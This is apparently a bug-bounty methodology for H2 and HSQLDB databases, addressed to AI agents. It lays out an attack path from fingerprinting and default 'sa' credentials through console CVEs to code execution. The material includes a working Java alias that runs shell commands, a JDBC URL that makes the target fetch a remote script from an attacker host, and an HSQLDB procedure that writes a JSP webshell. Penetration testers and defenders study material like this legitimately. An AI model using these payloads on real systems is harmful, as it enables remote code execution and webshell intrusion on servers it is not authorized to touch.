---
technology: "H2 Database"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: 1.0 (upstream-only new unit)
source: "rewritten from HackTricks (src/network-services-pentesting/pentesting-web/h2-java-sql-database.md; src/network-services-pentesting/9001-pentesting-hsqldb.md), CC BY-NC 4.0, accessed 2026-11-13"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference and primary advisories, not the writeup corpus. Verified 2026-11-13: NVD/GHSA-h376-j262-vhq6 CVE-2021-42392 (H2 1.1.100–2.0.204); NVD CVE-2022-23221 (console before 2.1.210); OSV/GHSA-xm2m-2q6h-22jw CVE-2023-34468 (Apache NiFi 0.0.2–1.21.0, fixed 1.22.0); h2database.com docs (INIT/RUNSCRIPT, alias commands); hsqldb.org guide (SQL-invoked routines, management/users). Companion overview: [[h2-database|H2 Database]]."
---

# H2 Database bug bounty methodology

Target model: an H2 engine reachable as (a) a web console, (b) SQL execution inside an application, or (c) an editable JDBC URL. Every path converges on making the JVM execute Java through the SQL layer, running with the application's OS privileges. The engine has no OS sandbox — aliases run as the process.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| H2 Console login (8082 conventional) | console reachable | version-gated: CVE-2021-42392 (≤2.0.204) / CVE-2022-23221 (<2.1.210) | RCE — Critical |
| Console login, fresh-DB creds | `sa`/empty accepted (embedded create-on-connect; remote creation disabled by default on current versions) | no (needs the DB to accept creation) | SQL → alias RCE — Critical |
| App SQL injection on H2 backend | stacked queries / multi-statement context | often | SQL → alias RCE — Critical |
| Editable JDBC URL (pool config, connection-details API) | URL saved and a NEW connection forced | no (authed config surface) | `INIT=RUNSCRIPT` RCE — Critical |
| CVE-2023-34468 surface (NiFi DBCPConnectionPool / HikariCPConnectionPool) | NiFi 0.0.2–1.21.0, authorized flow config | no | H2 URL code injection — High/Critical |
| HSQLDB server (9001) | server actually bound remotely (rare; usually localhost/in-memory) | no (`sa`/blank check) | JRT gadget RCE — High |

## Phase 1 — fingerprint

- Console: login form with a JDBC URL field, driver class, user, password. URL shapes identify the mode: `jdbc:h2:mem:NAME` (in-memory), `jdbc:h2:file:/path` (embedded file), `jdbc:h2:tcp://HOST/NAME` (server), `jdbc:h2:ssl://...` (TLS).
- In apps: `org.h2.Driver` in configs/stack traces, `jdbc:h2:` in properties/YAML, `SELECT H2VERSION()` if you have SQL.
- HSQLDB: nmap shows the service as a JDBC listener (`9001/tcp open jdbc`); the connection URL shape is `jdbc:hsqldb:hsql://TARGET_HOST/DBNAME` — the database name is required, recover it from app configs after compromising the box (`grep -rP 'jdbc:hsqldb.*password.*' /path/to/search`).
- Version is destiny: ≤2.0.204 → unauthenticated console CVE-2021-42392 candidate; <2.1.210 → CVE-2022-23221 candidate; 2.x current → console remote DB creation off by default, hunt creds/URL-injection instead.

## Phase 2 — access

1. Try `sa` with an empty password, then `sa`/`sa` — a fresh embedded database makes the supplied user its admin, and `sa` is the habitual choice. Failure is expected on configured apps; keep going via the URL/SQLi doors.
2. Known creds for another engine? The console connects to *any* JDBC URL you give it with the supplied driver/creds — use it as a generic SQL client once you hold credentials.
3. Embedded create-on-connect: pointing an embedded URL at a nonexistent DB creates it with your supplied user as administrator. Current versions block this remotely through the console/server unless explicitly enabled — on old 1.x installs it often just works.

## Phase 3 — CVE gates (console, unauthenticated)

| CVE | Versions | Mechanism | Notes |
|---|---|---|---|
| CVE-2021-42392 | 1.1.100 – 2.0.204 | `org.h2.util.JdbcUtils.getConnection` takes a driver class name + URL; a JNDI driver name and LDAP/RMI URL → code loading. Reachable through the console **without authentication** (GHSA-h376-j262-vhq6 / JFrog). | Post-2020 JDKs restrict remote JNDI codebase loading — on hardened runtimes the classic LDAP vector degrades to a local-class gadget problem. Confirm the target JDK before promising RCE. |
| CVE-2022-23221 | console before 2.1.210 | `jdbc:h2:mem` URL containing `IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT` → script runs at connect (NVD: explicitly a different bug than CVE-2021-42392). | Self-contained if your `RUNSCRIPT FROM` URL is fetchable by the target — no outbound-JNDI dependency. |

Trap note: **CVE-2021-42342 is not H2** — it is a GoAhead CGI-prefix issue; any reference tying that number to the H2 console is a miscite.

## Phase 4 — SQL execution → OS command (alias)

With SQL rights, bind a Java function and call it. Write your own body — this variant wraps the command in a shell so pipes/redirects work (`Runtime.exec` does not parse metacharacters itself):

```sql
CREATE ALIAS EXEC AS $$ String exec(String c) throws Exception {
  return new java.util.Scanner(Runtime.getRuntime()
      .exec(new String[]{"/bin/sh","-c",c}).getInputStream())
      .useDelimiter("\\A").next(); } $$;
CALL EXEC('id');
-- Windows targets: {"cmd","/c",c}
```

- On 1.x engines a `CREATE TRIGGER ... AS $$//javascript ... $$` body (Nashorn) is an equivalent primitive — the Metabase 2023 pre-auth chain (CVE-2023-38646, Assetnote research) used exactly that: an injected connection string carried a `CREATE TRIGGER ... $$//javascript ... new java.net.URL('http://...')...$$` payload. 2.x dropped the JavaScript source form.
- If aliases/triggers are stripped by hardening, `RUNSCRIPT FROM` (below) still executes arbitrary SQL files — file-read/write primitives in SQL are the fallback hunt.

## Phase 5 — JDBC URL / connection-pool injection

When an application lets you edit an H2 JDBC URL (connection-pool config page, connection-details API), treat the field as code execution:

1. Set the URL to `jdbc:h2:mem:maint;INIT=RUNSCRIPT FROM 'http://ATTACKER_IP/poc.sql'`.
2. Force a **new** connection: disable/re-enable the pool, restart the dependent job, or otherwise trigger reconnect — pooled connections never re-read the URL.
3. Serve `poc.sql` from a simple HTTP server; the access log confirms the trigger. Pause scheduled tasks while iterating — some apps reconnect on a schedule and will fetch the script repeatedly.
4. Stage 2 in the script: the `CREATE ALIAS` payload above, or anything else SQL can reach.

Version gate for the flagship instance: **CVE-2023-34468** — Apache NiFi 0.0.2–1.21.0 let an authorized user configure a Database URL with the H2 driver for code execution in `DBCPConnectionPool`/`HikariCPConnectionPool`; 1.22.0 validates the URL and rejects H2 JDBC locations. NiFi pre-check: if your user can already create/schedule processors like `ExecuteProcess`, that flow-admin level is OS command execution without any H2 detour — report the simpler finding.

## Phase 6 — HSQLDB routines (section)

Enumeration/entry: download HSQLDB, extract `hsqldb/lib/hsqldb.jar`, and launch the bundled Swing manager (`java -jar hsqldb.jar`) to connect with recovered credentials at `jdbc:hsqldb:hsql://TARGET_HOST/DBNAME`.

JRT rules: functions (return value) are invoked with `VALUES`, void methods are procedures invoked with `CALL`; an `hsqldb.method_class_names` allowlist may restrict callable classes.

Read a Java system property (recon inside the engine's JVM):

```sql
CREATE FUNCTION getprop(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty';
VALUES(getprop('user.name'));
```

Write a file (webshell drop) on older JDKs where the internal class is visible and allowed — `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` writes hex-decoded bytes; this is JDK- and module-policy-dependent and fails on modern runtimes. The 1024-byte cap below is the declared `VARBINARY(1024)` parameter, adjustable — not a gadget limit:

```sql
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
CALL writetofile('/path/ROOT/shell.jsp', CAST('3c25402070616765...' AS VARBINARY(1024)));
```

## Decision points

- Console reachable, version ≤2.0.204 → CVE-2021-42392 first (check target JDK JNDI posture), then CVE-2022-23221.
- Any SQL execution → alias payload; verify command output channel before escalating (DNS/HTTP callback beats console output).
- Config page with a JDBC URL → `INIT=RUNSCRIPT` + forced reconnect; watch for connection-recycle schedules that re-trigger.
- Found HSQLDB 9001 remotely → you likely already have a foothold; pivot to credential grep + JRT gadgets.

## Tool mapping (named in prose)

nmap for port/service discovery on 8082/9092/9001; curl for console form interaction; Python `http.server` to stage `RUNSCRIPT` payloads; the H2 jar itself (java -cp h2.jar org.h2.tools.Shell) as a command-line client when you hold TCP-server creds; the HSQLDB jar's DatabaseManagerSwing GUI for HSQLDB. No H2-specific Metasploit module exists — the application around the database is the usual exploit vehicle.
